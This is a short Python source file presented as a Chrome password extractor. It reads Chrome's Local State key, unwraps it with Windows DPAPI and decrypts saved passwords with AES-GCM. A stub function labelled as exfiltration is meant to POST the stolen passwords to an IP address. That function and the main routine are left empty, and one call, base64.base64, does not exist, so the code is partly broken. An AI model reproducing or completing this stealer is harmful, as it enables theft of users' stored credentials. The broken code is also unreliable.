"""
Author: Aleksa Zatezalo
Date: May 2025
Description: Extracts Chrome Passwords
"""

import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
import requests


# Password fetching functions
def chrome_date_and_time(chrome_data):
    """
    Returns date and time from google chrome datafile.
    """

    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)

def fetching_encryption_key():
    """
    Gets the chrome encryption key.
    """

    local_computer_directory_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")

    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)
    
    # decoding the encryption key using base64
    encryption_key = base64.base64(local_state_data["os_crypt"]["encrypted_key"])

    # remove Windows Data Protection API (DPAPI) str
    encryption_key = encryption_key[5:]

    # return decrypted key
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

def password_decryption(password, encryption_key):
    """
    Decrypts a password using the chrome decryption key.
    """

    try:
        iv = password[3:15]
        password = password[15:]

        # generate cipher
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)

        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[0])
        except:
            return "No Passwords"

def fetch_passwords():
    """
    Fetches passwords from chrome.
    """

    pass


# Exfiltrate password functionality
def send_passwords(ip, data):
    """
    Sends passwords to IP address via HTTP post request.
    """

    pass

def main():
    pass

if __name__ == "__main__":
    main()